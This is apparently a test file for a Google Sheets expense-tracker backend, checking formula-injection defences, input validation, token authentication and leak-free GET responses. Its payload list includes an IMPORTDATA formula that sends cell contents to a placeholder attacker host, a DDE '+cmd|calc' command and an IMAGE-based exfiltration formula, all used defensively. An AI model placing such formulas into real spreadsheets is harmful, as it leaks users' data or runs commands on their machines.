'use strict';
/* Seguridad del backend (Code.gs REAL sobre una hoja simulada):
   - inyección de fórmulas: nada que llegue de fuera puede acabar como fórmula en la hoja (el harness modela cómo Sheets evalúa =, +, -, @
     salvo en celdas con formato de texto plano);
   - validación estricta de entradas;
   - autenticación y lecturas por POST. */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const { makeEnv } = require('./gs_harness');

const DIST = path.join(__dirname, '..', 'dist', 'Code.gs');
const CODE = process.env.CODE_GS || (fs.existsSync(DIST) ? DIST : path.join(__dirname, '..', 'backend', 'Code.gs'));
const fresh = () => { const env = makeEnv(CODE); const token = env.setup(); return { env, token }; };
const peligros = (env) => Object.values(env.sheets).flatMap((sh) => sh.danger.map((d) => `${sh.name}!R${d.r}C${d.c}=${d.v}`));

const MAL = ['=IMPORTDATA("http://atacante.example/?"&A1)', '=HYPERLINK("http://x","clic")', '+cmd|calc', '-2+3', '@SUM(1,1)', '=1+1', '\t=1+1', '=IMAGE("http://x/"&B2)'];
const row = (o = {}) => ({ id: 'id-' + Math.random().toString(36).slice(2), fecha: '2026-10-15', categoria: 'Ocio', importe: 5, tipo: 'Gasto', detalle: 'ok', comercio: '', items: '', ticketId: '', origen: 'app', ...o });

test('hoja: ningún texto de fuera acaba como fórmula (todas las columnas de texto de Gastos)', () => {
  const { env, token } = fresh();
  const rows = MAL.map((m, i) => row({ id: 'g' + i, categoria: m, detalle: m, comercio: m, items: m, ticketId: m, origen: m, tipo: m }));
  const r = env.post({ token, action: 'add', rows });
  assert.equal(r.ok, true); assert.equal(r.added, MAL.length);
  assert.deepEqual(peligros(env), []);
  // y los datos se guardan tal cual (como texto), sin perder nada
  const d = env.read('data', token).gastos;
  assert.equal(d.find((g) => g.id === 'g0').detalle, MAL[0]);
  assert.equal(d.find((g) => g.id === 'g1').categoria, MAL[1]);
});

test('hoja: un ID válido que empieza por guion también se guarda como texto', () => {
  const { env, token } = fresh();
  assert.equal(env.post({ token, action: 'add', rows: [row({ id: '-abc_1' })] }).ok, true);
  assert.deepEqual(peligros(env), []);
});

test('hoja: extras, edición, diccionario y configuración también quedan como texto', () => {
  const { env, token } = fresh();
  assert.equal(env.post({ token, action: 'addExtra', rows: MAL.map((m, i) => ({ id: 'x' + i, fecha: '2026-10-01', tipo: m, importe: 3, detalle: m })) }).ok, true);
  env.post({ token, action: 'add', rows: [row({ id: 'u1' })] });
  for (const [k, m] of [['detalle', MAL[0]], ['categoria', MAL[1]], ['comercio', MAL[2]], ['items', MAL[3]]]) assert.equal(env.post({ token, action: 'update', id: 'u1', fields: { [k]: m } }).ok, true);
  for (const m of MAL) assert.equal(env.post({ token, action: 'dictSet', k: m, c: m, s: m }).ok, true);
  assert.equal(env.post({ token, action: 'dictSet', k: MAL[0], c: MAL[1], s: MAL[2] }).ok, true);          // la misma clave otra vez (actualiza)
  assert.equal(env.post({ token, action: 'configSet', key: 'cosa', value: -5 }).ok, true);
  assert.equal(env.post({ token, action: 'configSet', key: 'cosa', value: MAL[0] }).ok, true);
  assert.equal(env.post({ token, action: 'configSet', key: 'otra', value: { a: MAL[0] } }).ok, true);
  assert.deepEqual(peligros(env), []);
});

test('el modo Excel también: Gastos, Extras y sus ediciones', () => {
  const fx = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures', 'excel_fixture.json'), 'utf8'));
  const env = makeEnv(CODE);
  const mk = (name, grid, cols) => { const sh = env.ss.insertSheet(name); sh.grid = grid.map((r) => r.slice()); sh.maxRows = 69; sh.maxCols = cols; while (sh.grid.length < 69) sh.grid.push(new Array(cols).fill('')); return sh; };
  mk('⚙️ Piloto Automático', fx.piloto, 99); mk('📝 Gastos', fx.gastosCab, 14); mk('🚀 Extras', fx.extrasCab, 11);
  const token = env.setup();
  assert.equal(env.read('info', token).mode, 'excel');
  const r = env.post({ token, action: 'add', rows: MAL.map((m, i) => row({ id: 'g' + i, categoria: m, detalle: m, comercio: m, items: m, ticketId: m, origen: m })) });
  assert.equal(r.ok, true); assert.equal(r.added, MAL.length);
  assert.equal(env.post({ token, action: 'addExtra', rows: MAL.map((m, i) => ({ id: 'x' + i, fecha: '2026-10-01', tipo: m, importe: 3, detalle: m })) }).ok, true);
  for (const [k, m] of [['detalle', MAL[0]], ['categoria', MAL[1]], ['comercio', MAL[2]], ['items', MAL[3]]]) assert.equal(env.post({ token, action: 'update', id: 'g0', fields: { [k]: m } }).ok, true);
  // las fórmulas propias de la plantilla (columnas G/H) no las toca la app: aquí no deben aparecer como "peligro"
  const propios = peligros(env).filter((p) => !/=FORMULA_/.test(p));
  assert.deepEqual(propios, []);
});

test('validación: filas, IDs y campos mal formados se rechazan sin escribir nada', () => {
  const { env, token } = fresh();
  const malos = [
    [{ rows: 'no es lista' }, /lista/],
    [{ rows: [null] }, /Fila inválida/],
    [{ rows: [[1, 2]] }, /Fila inválida/],
    [{ rows: [row({ id: '' })] }, /inválida/],
    [{ rows: [row({ id: 'con espacio' })] }, /inválida/],
    [{ rows: [row({ id: '=1+1' })] }, /inválida/],
    [{ rows: [row({ id: 'x'.repeat(61) })] }, /inválida/],
    [{ rows: [row({ id: 'ñandú' })] }, /inválida/],
    [{ rows: [row({ id: { a: 1 } })] }, /inválida/],
    [{ rows: [row({ fecha: '2026-13-45x' })] }, /inválida/],
    [{ rows: [row({ importe: 'abc' })] }, /inválida/],
    [{ rows: [row({ importe: -5 })] }, /inválida/],
  ];
  for (const [body, re] of malos) {
    const r = env.post({ token, action: 'add', ...body });
    assert.equal(r.ok, false, JSON.stringify(body).slice(0, 60)); assert.match(r.error, re);
  }
  assert.equal(env.read('data', token).gastos.length, 0);
  env.post({ token, action: 'add', rows: [row({ id: 'v1' })] });
  assert.equal(env.post({ token, action: 'update', id: 'v 1', fields: {} }).ok, false);
  assert.equal(env.post({ token, action: 'update', id: 'v1', fields: ['x'] }).ok, false);
  assert.equal(env.post({ token, action: 'update', id: 'v1', fields: { importe: -1 } }).ok, false);
  assert.equal(env.post({ token, action: 'update', id: 'v1', fields: { fecha: 'ayer' } }).ok, false);
  assert.equal(env.post({ token, action: 'addExtra', rows: 'x' }).ok, false);
  assert.equal(env.post({ token, action: 'configSet', key: '__proto__', value: 1 }).ok, false);
  assert.equal(env.post({ token, action: 'configSet', key: 'a b', value: 1 }).ok, false);
  assert.equal(env.post({ token, action: 'configSet', key: 'ok', value: 'x'.repeat(46000) }).ok, false);
  assert.equal(env.post({ token, action: 'dictSet', k: '', c: 'x' }).ok, false);
});

test('límites: nunca más de 500 gastos ni 200 extras por petición; campos largos se recortan', () => {
  const { env, token } = fresh();
  const muchos = Array.from({ length: 700 }, (_, i) => row({ id: 'm' + i, detalle: 'd'.repeat(5000) }));
  assert.equal(env.post({ token, action: 'add', rows: muchos }).added, 500);
  assert.equal(env.read('data', token).gastos[0].detalle.length, 1000);
  const ex = Array.from({ length: 300 }, (_, i) => ({ id: 'e' + i, fecha: '2026-10-01', tipo: 't', importe: 1, detalle: '' }));
  assert.equal(env.post({ token, action: 'addExtra', rows: ex }).added, 200);
});

test('autenticación: token ausente, corto, largo, de otro tipo o con cuerpo raro → siempre rechazo', () => {
  const { env, token } = fresh();
  const intentos = [undefined, null, '', 'x', token.slice(1), token + '0', token.toUpperCase() === token ? token.toLowerCase() + 'z' : token.toUpperCase(), 0, 1, true, [token], { t: token }, token.replace(/.$/, (c) => (c === 'a' ? 'b' : 'a'))];
  for (const t of intentos) {
    for (const action of ['data', 'rev', 'info', 'add', 'update', 'delete', 'dictSet', 'configSet', 'addExtra']) {
      const r = env.post({ token: t, action, rows: [], id: 'a', fields: {}, k: 'a', c: 'b', key: 'abc', value: 1 });
      assert.equal(r.ok, false, `${JSON.stringify(t)} ${action}`); assert.equal(r.code, 'auth');
    }
  }
  assert.equal(env.post('[]').code, 'bad-json'); assert.equal(env.post('null').code, 'bad-json'); assert.equal(env.post('{no json').code, 'bad-json');
  assert.equal(env.post({ token, action: 'no-existe' }).code, 'bad-action');
  assert.equal(env.read('data', token).ok, true);                       // y el token bueno sí entra
});

test('GET no devuelve ni muestra nada sensible, con o sin token; los errores no filtran detalles internos', () => {
  const { env, token } = fresh();
  env.post({ token, action: 'add', rows: [row({ id: 'p1', detalle: 'secreto' })] });
  for (const q of [{}, { action: 'ping' }, { action: 'data' }, { action: 'data', token }, { action: 'rev', token }, { action: 'info', token }, { token }]) {
    const txt = JSON.stringify(env.get(q));
    assert.ok(!txt.includes('secreto') && !txt.includes(token), txt);
  }
});

test('regenerar el token invalida el anterior (los dispositivos viejos dejan de entrar)', () => {
  const { env, token } = fresh();
  assert.equal(env.read('info', token).ok, true);
  env.call('regenToken');
  assert.equal(env.read('info', token).code, 'auth');
});
